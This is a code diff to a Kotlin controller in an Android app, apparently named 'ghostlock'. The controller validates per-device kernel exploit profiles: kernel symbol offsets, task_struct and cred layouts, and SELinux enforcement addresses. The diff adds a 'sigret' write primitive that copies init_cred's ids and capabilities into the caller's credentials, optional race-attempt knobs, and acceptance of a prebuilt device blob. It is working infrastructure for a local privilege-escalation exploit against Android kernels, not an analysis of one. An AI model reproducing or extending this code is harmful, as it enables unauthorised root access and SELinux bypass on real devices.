@@ -53,12 +53,20 @@ internal class AndroidProfileConfigController(
         val full = resolveCurrent(deviceRelease, pair, advanced, includeImported = true)
         if (full == null) {
             cache(deviceRelease, null)
+            /* PHY110: the device-verified prebuilt GLK1 blob (assets/prebuilt/)
+             * is itself a valid profile for this release. The conf catalog
+             * deliberately has no entry for it, so an unverified conversion can
+             * never replace the calibrated blob. */
+            if (Phy110Profiles.prebuiltBlob(appContext, deviceRelease) != null) {
+                return ProfileConfig(release = deviceRelease, hasProfile = true)
+            }
             return ProfileConfig(release = deviceRelease, hasProfile = false)
         }
         val baseline = resolveCurrent(deviceRelease, pair, null, includeImported = false) ?: full
         val route = routeNameOf(full)
         val fallbackTo = fallbackTargetOf(full)
-        val invalidPaths = validateProfileFields(full, route, fallbackTo) +
+        val punch = punchOf(full)
+        val invalidPaths = validateProfileFields(full, route, fallbackTo, punch) +
             ProfileResolver.validateMerged(full, route, fallbackTo).mapTo(mutableSetOf()) { it.fieldPath }
         /* Invalid fields missing from the resolved document still get a row,
          * otherwise the run stays blocked with no red field to fix. */
@@ -75,6 +83,7 @@ internal class AndroidProfileConfigController(
             roots = roots,
             general = generalFields(full, baseline, route, fallbackTo),
             route = route,
+            punch = punch,
             fallbackTo = fallbackTo,
             invalidPaths = invalidPaths,
         )
@@ -83,13 +92,17 @@ internal class AndroidProfileConfigController(
     /**
      * Kotlin-side geometry/credential validation. The profile declares its
      * route explicitly; fields that belong to other routes may stay absent.
+     * `punch` decides how much of `init_cred` is copied, so it also decides
+     * which credential fields are mandatory.
      */
     private fun validateProfileFields(
         profile: ValueMap,
         explicitRoute: String?,
         fallbackTo: String?,
+        punch: String?,
     ): Set<String> {
         val invalid = mutableSetOf<String>()
+        val sigretPunch = punch == PunchSigret
         fun value(path: String): Long? = profile.getLongAt(path)
         fun requireNonZero(vararg paths: String) {
             paths.forEach { path ->
@@ -175,12 +188,22 @@ internal class AndroidProfileConfigController(
                 } else if (compact < 0L || compact > 0xffL) {
                     invalid += "$routePrefix.compact_waiter"
                 }
-                requireNonZero(
-                    "kernelsnitch.mm_struct_sz",
-                    "offset.empty_zero_page",
-                    "cred.ref_count",
-                )
-                if (copySize != null && copySize < 0xa0L) invalid += "cred.copy_size"
+                requireNonZero("kernelsnitch.mm_struct_sz", "offset.empty_zero_page")
+                if (sigretPunch) {
+                    /* The sigret punch copies only the scalar prefix of
+                     * init_cred (usage, ids, securebits, caps). The
+                     * security/user/user_ns pointer slots of the caller's own
+                     * cred stay untouched, so no reference entries are needed
+                     * and the copy may stay below 0xa0 - which is exactly the
+                     * shape of the device-verified PHY110 blob (copy_size 80,
+                     * caps_offset 48, 3 cap words, no refs). */
+                } else {
+                    /* The multicast punch overwrites the whole credential
+                     * object, so the four referenced pointers must be carried
+                     * and the copy has to span them. */
+                    requireNonZero("cred.ref_count")
+                    if (copySize != null && copySize < 0xa0L) invalid += "cred.copy_size"
+                }
                 val waiterOff = value("$routePrefix.waiter_off")
                 if (waiterOff == null || waiterOff <= 0L || waiterOff > Int.MAX_VALUE.toLong()) {
                     invalid += "$routePrefix.waiter_off"
@@ -234,6 +257,10 @@ internal class AndroidProfileConfigController(
         }
         return invalid
     }
+
+    /** The declared copy primitive, or null when the route default applies. */
+    private fun punchOf(profile: ValueMap): String? =
+        (profile["punch"] as? String)?.trim()?.takeIf { it.isNotEmpty() && it != "null" }
 
     /** The single branch key declared under "route" (string legacy allowed). */
     private fun routeNameOf(profile: ValueMap): String? {
@@ -570,8 +597,19 @@ internal class AndroidProfileConfigController(
             tuningExecution = tuningExecution,
             pair = CpuPairView(pair.primary, pair.consumer),
             routePresets = routePresets,
+            pairExplicit = hasExplicitCpuPair(),
         )
     }.getOrNull()
+
+    /**
+     * True once the user has picked a CPU pair. `cpu_pair` is written by
+     * [selectCpuPair] only on an explicit choice, so its presence is exactly
+     * that signal: without it the pair passed in is just the UI fallback and a
+     * profile's own `recommended_cpus` (measured on the device) may override it.
+     */
+    private fun hasExplicitCpuPair(): Boolean =
+        appContext.getSharedPreferences("ghostlock_prefs", Context.MODE_PRIVATE)
+            .getString("cpu_pair", null)?.isNotBlank() == true
 
     /**
      * Native decodes one complete `execution.routes` object, while profiles only
@@ -848,6 +886,8 @@ internal class AndroidProfileConfigController(
 
     internal companion object {
         private const val BuiltinDirectory = "kernel_profiles"
+        /** Profile spelling of the 64-bit rt_sigreturn fpsimd punch. */
+        internal const val PunchSigret = "sigret"
         private val RouteCommonRequired = listOf(
             "offset.init_task", "offset.init_cred", "offset.root_task_group", "offset.selinux_enforcing",
             "task_struct.prio", "task_struct.pi_lock", "task_struct.pi_waiters", "task_struct.pi_blocked_on",
@@ -878,8 +918,12 @@ internal class AndroidProfileConfigController(
             "multicast_waiter" to listOf(
                 "waiter_off", "buffer_size", "task_offset", "lock_offset",
                 "compact_waiter",
+                /* Optional lottery knobs: absent = historical single shot. */
+                "attempts", "arm_sequence", "arm_hold",
             ),
         )
+        /* Required geometry only. The lottery knobs stay optional so that a
+         * profile authored before they existed still validates. */
         private val RouteMulticastFields = listOf(
             "buffer_size", "task_offset", "lock_offset",
         )
